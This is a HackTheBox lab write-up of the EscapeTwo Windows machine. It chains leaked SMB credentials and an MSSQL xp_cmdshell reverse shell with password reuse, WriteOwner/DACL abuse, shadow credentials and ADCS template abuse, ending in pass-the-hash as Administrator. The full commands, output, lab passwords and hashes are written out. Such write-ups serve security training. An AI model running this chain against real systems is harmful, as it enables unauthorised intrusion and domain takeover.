---
title: "HTB - EscapeTwo (Medium | Windows | Active Directory)"
date: 2025-02-16 00:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, mssql, xp-cmdshell, smb, bloodhound, writeowner, dacl, certipy, adcs, esc, shadow-credentials, evil-winrm, impacket]
image:
  path: https://i.pinimg.com/originals/88/53/30/885330328dd37156ec1b90d1b918bf1d.gif
---

## Overview

**EscapeTwo** is a Medium-rated HackTheBox Windows machine that chains SMB credential exposure, MSSQL remote code execution, and Active Directory Certificate Services (ADCS) abuse to achieve Domain Admin. The path involves extracting credentials from an SMB share, enabling `xp_cmdshell` for a reverse shell, abusing `WriteOwner` permissions via BloodHound, and exploiting a vulnerable certificate template to impersonate the Administrator.

| Field | Details |
|---|---|
| OS | Windows Server |
| Difficulty | Medium |
| IP | 10.10.11.51 |
| Domain | sequel.htb / dc01.sequel.htb |

---

## Reconnaissance

### Nmap

```bash
nmap -p- --min-rate 5000 -sV -Pn 10.10.11.51
```

```
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server
Service Info: OS: Windows
```

Notable: MSSQL on port 1433 alongside the standard DC ports.

```bash
sudo sh -c "echo '10.10.11.51 dc01 sequel.htb dc01.sequel.htb' >> /etc/hosts"
```

---

## Enumeration

### SMB — Credential Discovery

Verifying credentials and enumerating shares with `rose`:

```bash
crackmapexec smb 10.10.11.51 -u "rose" -p "KxEPkKe6R8su" --rid-brute | grep SidTypeUser
smbclient -L //10.10.11.51 -U rose
```

Accessing the `Accounting Department` share:

```bash
smbclient "//10.10.11.51/Accounting Department" -U rose
```

Excel files (`.xlsx`) found inside contain plaintext credentials — including MSSQL SA credentials.

---

## Foothold — MSSQL RCE via xp_cmdshell

### Connecting to SQL Server

```bash
sudo impacket-mssqlclient 10.10.11.51/sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

### Enabling xp_cmdshell

```sql
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Reverse Shell via PowerShell

Generate a base64-encoded PowerShell reverse shell payload and execute:

```sql
xp_cmdshell powershell -e <BASE64_REVERSE_SHELL>
```

Start listener:

```bash
nc -lvnp 1337
```

Shell received as a low-privileged user.

---

## Credential Harvesting — SQL Service Account

Browsing the filesystem reveals the SQL Server installation directory:

```bash
cat C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI
```

```ini
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

### WinRM as ryan

Password reuse — `ryan` shares the same password:

```bash
evil-winrm -i 10.10.11.51 -u "ryan" -p "WqSZAF6CysDQbGb3"
```

```powershell
type user.txt
```

**User flag captured.**

---

## Privilege Escalation — ADCS Abuse (ESC + WriteOwner)

### BloodHound Enumeration

```bash
bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
```

BloodHound reveals: `ryan` has **WriteOwner** over `ca_svc`.

### Step 1 — Take Ownership of ca_svc

```bash
bloodyAD --host dc01.sequel.htb -d sequel.htb \
  -u ryan -p WqSZAF6CysDQbGb3 \
  set owner ca_svc ryan
```

```
[+] Old owner replaced by ryan on ca_svc
```

### Step 2 — Grant FullControl via DACL

```bash
impacket-dacledit -action 'write' -rights 'FullControl' \
  -principal 'ryan' -target 'ca_svc' \
  'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

```
[*] DACL modified successfully!
```

### Step 3 — Shadow Credentials to Extract ca_svc NT Hash

```bash
certipy-ad shadow auto \
  -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' \
  -dc-ip 10.10.11.51 -ns 10.10.11.51 \
  -target dc01.sequel.htb -account ca_svc
```

```
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

### Step 4 — Find Vulnerable Certificate Template

```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find \
  -scheme ldap -k -target dc01.sequel.htb \
  -dc-ip 10.10.11.51 -vulnerable -stdout
```

```
Template Name: DunderMifflinAuthentication
```

### Step 5 — Modify Template to Allow UPN Spoofing

```bash
KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template \
  -k -template DunderMifflinAuthentication \
  -target dc01.sequel.htb -dc-ip 10.10.11.51
```

```
[*] Successfully updated 'DunderMifflinAuthentication'
```

### Step 6 — Request Certificate as Administrator

```bash
certipy-ad req \
  -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce \
  -ca sequel-DC01-CA -target DC01.sequel.htb \
  -dc-ip 10.10.11.51 \
  -template DunderMifflinAuthentication \
  -upn Administrator@sequel.htb \
  -ns 10.10.11.51
```

```
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Step 7 — Authenticate and Extract NT Hash

```bash
certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.10.11.51
```

```
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

### Step 8 — WinRM as Administrator

```bash
evil-winrm -i dc01.sequel.htb -u administrator \
  -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

```powershell
type root.txt
```

**Root flag captured.**

---

## Attack Chain Summary

```
SMB share (Accounting Department)
  └─► Excel files → SA credentials
        └─► MSSQL xp_cmdshell → reverse shell
              └─► sql-Configuration.INI → sql_svc:WqSZAF6CysDQbGb3
                    └─► Password reuse → ryan (WinRM)
                          └─► User Flag
                                └─► BloodHound → ryan has WriteOwner over ca_svc
                                      └─► Take ownership + FullControl DACL
                                            └─► Shadow credentials → ca_svc NT hash
                                                  └─► Vulnerable template: DunderMifflinAuthentication
                                                        └─► certipy req → administrator.pfx
                                                              └─► certipy auth → Administrator NT hash
                                                                    └─► WinRM → Root Flag
```

---

## Key Takeaways

- **SMB shares** in corporate environments frequently contain sensitive documents — always enumerate all shares and their contents.
- **xp_cmdshell** is a well-known MSSQL feature that enables OS command execution; it should be disabled in production but is often left enabled or re-enabled after misconfiguration.
- **WriteOwner** over an AD object is effectively full control — ownership grants the ability to modify DACLs arbitrarily.
- **ADCS certificate template abuse** (ESC-style) combined with Shadow Credentials is a reliable path to Domain Admin when a CA is present and templates are misconfigured.
